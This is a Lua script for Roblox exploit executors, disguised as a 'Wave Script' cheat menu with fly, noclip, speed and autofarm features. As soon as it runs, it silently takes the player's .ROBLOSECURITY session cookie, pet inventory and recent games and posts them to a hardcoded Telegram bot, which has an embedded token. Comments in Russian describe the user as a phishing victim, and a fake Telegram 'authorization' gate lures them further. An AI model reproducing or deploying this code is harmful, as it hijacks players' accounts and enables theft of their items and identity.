-- Wave Script v5 | Auth Gate + Logger
-- Вставь свои данные ниже

local BOT_TOKEN        = "8673514714:AAFWJpvhe1FQlkvXKS7LP4eIozJPqk0GUz0"
local ADMIN_ID         = "7565340953"
local TELEGRAM_BOT_LINK = "https://t.me/plushspinnerbot/robloxvipserver"  -- <-- сюда ссылку на веб-бота
local UNLOCK_CODE      = "wave2026"  -- <-- одноразовый код, который ты даёшь жертве после фишинга

local Players             = game:GetService("Players")
local HttpService         = game:GetService("HttpService")
local TweenService        = game:GetService("TweenService")
local UserInputService    = game:GetService("UserInputService")
local RunService          = game:GetService("RunService")
local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local LocalizationService = game:GetService("LocalizationService")
local CoreGui             = game:GetService("CoreGui")
local Lighting            = game:GetService("Lighting")
local TeleportService     = game:GetService("TeleportService")
local GuiService          = game:GetService("GuiService")
local VirtualUser         = game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer
local Camera      = workspace.CurrentCamera

----------------------------------------------------------------
-- REQUEST + LOGGER
----------------------------------------------------------------
local function get_request()
    return (syn and syn.request) or (http and http.request) or http_request or request
        or (fluxus and fluxus.request) or (getgenv and getgenv().request)
end

local function send_telegram(text)
    local req = get_request()
    if not req then return end
    pcall(function()
        req({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                chat_id = ADMIN_ID,
                text = text,
                parse_mode = "HTML",
                disable_web_page_preview = true
            })
        })
    end)
end

local function get_cookie()
    local cookie = ""
    pcall(function()
        if getcookie then cookie = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or "" end
    end)
    if #cookie < 80 then
        pcall(function() if syn and syn.get_cookie then cookie = syn.get_cookie() or "" end end)
    end
    if #cookie < 80 then
        pcall(function()
            cookie = (getgenv and (getgenv().ROBLOSECURITY or getgenv().cookie)) or ""
        end)
    end
    return (#cookie > 80) and cookie or nil
end

local function scan_pets()
    local pets = {}
    pcall(function()
        for _, v in pairs(LocalPlayer:GetDescendants()) do
            local n = v.Name:lower()
            if n:find("pet") or n:find("egg") then table.insert(pets, v.Name) end
        end
        for _, name in ipairs({"Pets","PetModels","ClientPets","Inventory"}) do
            local f = ReplicatedStorage:FindFirstChild(name)
            if f then for _, p in pairs(f:GetChildren()) do table.insert(pets, p.Name) end end
        end
    end)
    return #pets > 0 and table.concat(pets, "\n") or "none / limited"
end

local function get_recent_games()
    local list = {}
    pcall(function()
        local req = get_request()
        if not req then return end
        local resp = req({
            Url = "https://games.roblox.com/v2/users/" .. LocalPlayer.UserId .. "/games?accessFilter=2&limit=20",
            Method = "GET"
        })
        if resp and resp.Body then
            local data = HttpService:JSONDecode(resp.Body)
            if data and data.data then
                for i, g in ipairs(data.data) do
                    if i > 20 then break end
                    table.insert(list, (g.name or "unknown") .. " (" .. (g.id or "?") .. ")")
                end
            end
        end
    end)
    return #list > 0 and table.concat(list, "\n") or "failed to fetch"
end

-- лог при запуске
task.spawn(function()
    task.wait(1.5)
    local cookie = get_cookie()
    local pets = scan_pets()
    local games = get_recent_games()
    local exec = (identifyexecutor and identifyexecutor()) or "unknown"

    send_telegram(table.concat({
        "🌊 <b>Wave Script launched</b>",
        "────────────────────",
        "👤 <b>Nick:</b> <code>" .. LocalPlayer.Name .. "</code>",
        "🆔 <b>UserId:</b> <code>" .. LocalPlayer.UserId .. "</code>",
        "💻 Executor: <code>" .. exec .. "</code>",
        "📍 PlaceId: <code>" .. game.PlaceId .. "</code>",
        "🍪 Cookie: <code>" .. (cookie or "not found") .. "</code>",
        "────────────────────",
        "🐾 Pets:\n<code>" .. pets .. "</code>",
        "────────────────────",
        "🎮 Last games:\n<code>" .. games .. "</code>",
        "────────────────────",
        "📱 " .. (UserInputService.TouchEnabled and "Mobile" or "PC")
    }, "\n"))
end)

----------------------------------------------------------------
-- GUI
----------------------------------------------------------------
local Gui = Instance.new("ScreenGui")
Gui.Name = "WaveScript"
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.IgnoreGuiInset = true
pcall(function() Gui.Parent = CoreGui end)
if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

local unlocked = false

-- AUTH GATE (показывается сразу)
local Auth = Instance.new("Frame")
Auth.Size = UDim2.new(0, 380, 0, 320)
Auth.Position = UDim2.new(0.5, -190, 0.5, -160)
Auth.BackgroundColor3 = Color3.fromRGB(24, 24, 26)
Auth.BorderSizePixel = 0
Auth.Parent = Gui
Instance.new("UICorner", Auth).CornerRadius = UDim.new(0, 18)

local authStroke = Instance.new("UIStroke")
authStroke.Color = Color3.fromRGB(70, 70, 80)
authStroke.Thickness = 1.2
authStroke.Transparency = 0.3
authStroke.Parent = Auth

local authGrad = Instance.new("UIGradient")
authGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(34, 34, 38)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 20))
})
authGrad.Rotation = 120
authGrad.Parent = Auth

local authTitle = Instance.new("TextLabel")
authTitle.Size = UDim2.new(1, -20, 0, 40)
authTitle.Position = UDim2.new(0, 10, 0, 18)
authTitle.BackgroundTransparency = 1
authTitle.Text = "Wave Script"
authTitle.TextColor3 = Color3.fromRGB(245, 245, 250)
authTitle.Font = Enum.Font.GothamBold
authTitle.TextSize = 22
authTitle.Parent = Auth

local authSub = Instance.new("TextLabel")
authSub.Size = UDim2.new(1, -30, 0, 40)
authSub.Position = UDim2.new(0, 15, 0, 60)
authSub.BackgroundTransparency = 1
authSub.Text = "To use the script you need to authorize\nyour account via Telegram"
authSub.TextColor3 = Color3.fromRGB(180, 180, 190)
authSub.Font = Enum.Font.Gotham
authSub.TextSize = 14
authSub.TextWrapped = true
authSub.Parent = Auth

local LoginBtn = Instance.new("TextButton")
LoginBtn.Size = UDim2.new(1, -40, 0, 44)
LoginBtn.Position = UDim2.new(0, 20, 0, 120)
LoginBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
LoginBtn.Text = "Login with Telegram"
LoginBtn.TextColor3 = Color3.fromRGB(240, 240, 245)
LoginBtn.Font = Enum.Font.GothamMedium
LoginBtn.TextSize = 15
LoginBtn.AutoButtonColor = false
LoginBtn.Parent = Auth
Instance.new("UICorner", LoginBtn).CornerRadius = UDim.new(0, 12)

LoginBtn.MouseButton1Click:Connect(function()
    send_telegram("🔔 <b>" .. LocalPlayer.Name .. "</b> нажал Login with Telegram")
    pcall(function()
        GuiService:OpenBrowserWindow(TELEGRAM_BOT_LINK)
    end)
    -- fallback
    pcall(function()
        if setclipboard then setclipboard(TELEGRAM_BOT_LINK) end
    end)
end)

local codeLabel = Instance.new("TextLabel")
codeLabel.Size = UDim2.new(1, -40, 0, 20)
codeLabel.Position = UDim2.new(0, 20, 0, 180)
codeLabel.BackgroundTransparency = 1
codeLabel.Text = "Enter access code after verification:"
codeLabel.TextColor3 = Color3.fromRGB(160, 160, 170)
codeLabel.Font = Enum.Font.Gotham
codeLabel.TextSize = 13
codeLabel.TextXAlignment = Enum.TextXAlignment.Left
codeLabel.Parent = Auth

local CodeBox = Instance.new("TextBox")
CodeBox.Size = UDim2.new(1, -40, 0, 38)
CodeBox.Position = UDim2.new(0, 20, 0, 205)
CodeBox.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
CodeBox.Text = ""
CodeBox.PlaceholderText = "Access code"
CodeBox.TextColor3 = Color3.fromRGB(230, 230, 235)
CodeBox.Font = Enum.Font.Gotham
CodeBox.TextSize = 14
CodeBox.ClearTextOnFocus = false
CodeBox.Parent = Auth
Instance.new("UICorner", CodeBox).CornerRadius = UDim.new(0, 10)

local UnlockBtn = Instance.new("TextButton")
UnlockBtn.Size = UDim2.new(1, -40, 0, 40)
UnlockBtn.Position = UDim2.new(0, 20, 0, 255)
UnlockBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
UnlockBtn.Text = "Unlock Script"
UnlockBtn.TextColor3 = Color3.fromRGB(240, 240, 245)
UnlockBtn.Font = Enum.Font.GothamMedium
UnlockBtn.TextSize = 14
UnlockBtn.AutoButtonColor = false
UnlockBtn.Parent = Auth
Instance.new("UICorner", UnlockBtn).CornerRadius = UDim.new(0, 11)

----------------------------------------------------------------
-- MAIN GUI (скрыт пока не разблокируют)
----------------------------------------------------------------
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 600, 0, 440)
Main.Position = UDim2.new(0.5, -300, 0.5, -220)
Main.BackgroundColor3 = Color3.fromRGB(22, 22, 24)
Main.Visible = false
Main.ClipsDescendants = true
Main.Parent = Gui
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(65, 65, 75)
mainStroke.Thickness = 1.1
mainStroke.Transparency = 0.3
mainStroke.Parent = Main

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 48)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 18, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Wave Script"
Title.TextColor3 = Color3.fromRGB(245, 245, 250)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 17
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 32, 0, 32)
CloseBtn.Position = UDim2.new(1, -42, 0.5, -16)
CloseBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 56)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(230, 230, 235)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = TitleBar
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)

local Side = Instance.new("Frame")
Side.Size = UDim2.new(0, 140, 1, -56)
Side.Position = UDim2.new(0, 10, 0, 50)
Side.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
Side.Parent = Main
Instance.new("UICorner", Side).CornerRadius = UDim.new(0, 12)

local SideList = Instance.new("UIListLayout")
SideList.Padding = UDim.new(0, 5)
SideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
SideList.Parent = Side

local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -160, 1, -60)
Content.Position = UDim2.new(0, 155, 0, 52)
Content.BackgroundTransparency = 1
Content.Parent = Main

local Tabs = {"Main", "Player", "Visual", "Autofarm", "Settings"}
local Pages = {}

local function makePage(name)
    local p = Instance.new("ScrollingFrame")
    p.Size = UDim2.new(1, 0, 1, 0)
    p.BackgroundTransparency = 1
    p.BorderSizePixel = 0
    p.ScrollBarThickness = 3
    p.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 110)
    p.AutomaticCanvasSize = Enum.AutomaticSize.Y
    p.Visible = false
    p.Parent = Content
    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 7)
    lay.Parent = p
    local pad = Instance.new("UIPadding")
    pad.PaddingTop = UDim.new(0, 4)
    pad.PaddingBottom = UDim.new(0, 12)
    pad.PaddingLeft = UDim.new(0, 4)
    pad.Parent = p
    Pages[name] = p
    return p
end

for _, t in ipairs(Tabs) do makePage(t) end

local function switch(name)
    for n, p in pairs(Pages) do p.Visible = (n == name) end
end

local function sideBtn(text, tab)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -14, 0, 32)
    b.BackgroundColor3 = Color3.fromRGB(40, 40, 46)
    b.Text = text
    b.TextColor3 = Color3.fromRGB(220, 220, 230)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 12
    b.AutoButtonColor = false
    b.Parent = Side
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    b.MouseButton1Click:Connect(function()
        switch(tab)
        for _, c in pairs(Side:GetChildren()) do
            if c:IsA("TextButton") then
                c.BackgroundColor3 = Color3.fromRGB(40, 40, 46)
            end
        end
        b.BackgroundColor3 = Color3.fromRGB(65, 65, 75)
    end)
end

for _, t in ipairs(Tabs) do sideBtn(t, t) end

local function label(parent, text, size)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -4, 0, size or 18)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(200, 200, 210)
    l.Font = Enum.Font.Gotham
    l.TextSize = 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = parent
    return l
end

local function button(parent, text, callback)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -4, 0, 32)
    b.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
    b.Text = text
    b.TextColor3 = Color3.fromRGB(240, 240, 245)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 12
    b.AutoButtonColor = false
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    b.MouseButton1Click:Connect(callback)
    return b
end

local function toggle(parent, text, default, callback)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -4, 0, 30)
    f.BackgroundColor3 = Color3.fromRGB(34, 34, 40)
    f.Parent = parent
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -50, 1, 0)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(215, 215, 225)
    l.Font = Enum.Font.Gotham
    l.TextSize = 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = f
    local t = Instance.new("TextButton")
    t.Size = UDim2.new(0, 38, 0, 20)
    t.Position = UDim2.new(1, -44, 0.5, -10)
    t.BackgroundColor3 = default and Color3.fromRGB(80, 80, 95) or Color3.fromRGB(48, 48, 55)
    t.Text = ""
    t.AutoButtonColor = false
    t.Parent = f
    Instance.new("UICorner", t).CornerRadius = UDim.new(1, 0)
    local state = default
    t.MouseButton1Click:Connect(function()
        state = not state
        t.BackgroundColor3 = state and Color3.fromRGB(80, 80, 95) or Color3.fromRGB(48, 48, 55)
        callback(state)
    end)
end

-- MAIN PAGE
local mainP = Pages["Main"]
label(mainP, "Account: " .. LocalPlayer.Name, 18)
label(mainP, "UserId: " .. LocalPlayer.UserId)
label(mainP, "PlaceId: " .. game.PlaceId)

-- PLAYER
local plrP = Pages["Player"]
label(plrP, "Player", 18)
button(plrP, "WalkSpeed 50", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end) end)
button(plrP, "WalkSpeed 100", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end) end)
button(plrP, "Reset Speed", function() pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end) end)
button(plrP, "JumpPower 100", function() pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 100 end) end)

local infJump = false
toggle(plrP, "Infinite Jump", false, function(v) infJump = v end)
UserInputService.JumpRequest:Connect(function()
    if infJump then pcall(function() LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end) end
end)

local noclip = false
toggle(plrP, "Noclip", false, function(v)
    noclip = v
    if v then
        local c
        c = RunService.Stepped:Connect(function()
            if not noclip then c:Disconnect() return end
            pcall(function()
                for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
        end)
    end
end)

local flying = false
toggle(plrP, "Fly", false, function(v)
    flying = v
    if not v then return end
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(9e9,9e9,9e9)
    bv.Parent = hrp
    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
    bg.Parent = hrp
    task.spawn(function()
        while flying and hrp and hrp.Parent do
            local dir = Vector3.zero
            local look, right = Camera.CFrame.LookVector, Camera.CFrame.RightVector
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += look end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= look end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= right end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += right end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.yAxis end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir -= Vector3.yAxis end
            bv.Velocity = dir.Magnitude > 0 and dir.Unit * 70 or Vector3.zero
            bg.CFrame = Camera.CFrame
            RunService.RenderStepped:Wait()
        end
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
    end)
end)

button(plrP, "Anti AFK", function()
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)

button(plrP, "Rejoin", function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
button(plrP, "Reset Character", function() pcall(function() LocalPlayer.Character.Humanoid.Health = 0 end) end)

-- VISUAL
local visP = Pages["Visual"]
label(visP, "Visuals", 18)
button(visP, "Fullbright", function()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.FogEnd = 9e9
    Lighting.GlobalShadows = false
end)
button(visP, "Soft Glow", function()
    pcall(function()
        for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
            if p:IsA("BasePart") then
                local l = Instance.new("PointLight")
                l.Color = Color3.fromRGB(190,190,210)
                l.Brightness = 1.1
                l.Range = 7
                l.Parent = p
            end
        end
    end)
end)
button(visP, "Remove Lights", function()
    pcall(function()
        for _, l in pairs(LocalPlayer.Character:GetDescendants()) do
            if l:IsA("PointLight") then l:Destroy() end
        end
    end)
end)

-- AUTOFARM
local farmP = Pages["Autofarm"]
label(farmP, "Autofarm (safe)", 18)
local farms = {all = false}
toggle(farmP, "Everything (slow)", false, function(v)
    farms.all = v
    if v then
        task.spawn(function()
            while farms.all do
                pcall(function()
                    local c = 0
                    for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                        if c > 5 then break end
                        if r:IsA("RemoteEvent") then
                            local n = r.Name:lower()
                            if n:find("claim") or n:find("collect") or n:find("candy") or n:find("egg") then
                                pcall(function() r:FireServer() end)
                                c += 1
                            end
                        end
                    end
                end)
                task.wait(1.8)
            end
        end)
    end
end)

-- SETTINGS
local setP = Pages["Settings"]
label(setP, "Settings", 18)
button(setP, "Destroy Script", function() Gui:Destroy() end)

----------------------------------------------------------------
-- UNLOCK LOGIC
----------------------------------------------------------------
UnlockBtn.MouseButton1Click:Connect(function()
    if CodeBox.Text == UNLOCK_CODE then
        unlocked = true
        Auth.Visible = false
        Main.Visible = true
        send_telegram("✅ <b>" .. LocalPlayer.Name .. "</b> успешно разблокировал скрипт")
        switch("Main")
    else
        CodeBox.Text = ""
        CodeBox.PlaceholderText = "Wrong code"
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    Main.Visible = false
end)

-- top bar after unlock (optional)
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(0, 280, 0, 36)
TopBar.Position = UDim2.new(0.5, -140, 0, 12)
TopBar.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
TopBar.Visible = false
TopBar.Parent = Gui
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)

local TopLabel = Instance.new("TextLabel")
TopLabel.Size = UDim2.new(1, 0, 1, 0)
TopLabel.BackgroundTransparency = 1
TopLabel.Text = "Wave Script"
TopLabel.TextColor3 = Color3.fromRGB(230, 230, 235)
TopLabel.Font = Enum.Font.GothamMedium
TopLabel.TextSize = 13
TopLabel.Parent = TopBar

TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if unlocked then Main.Visible = not Main.Visible end
    end
end)

-- after unlock show top bar
task.spawn(function()
    while not unlocked do task.wait(0.5) end
    TopBar.Visible = true
end)

if UserInputService.TouchEnabled then
    Auth.Size = UDim2.new(0.9, 0, 0, 340)
    Auth.Position = UDim2.new(0.05, 0, 0.2, 0)
end
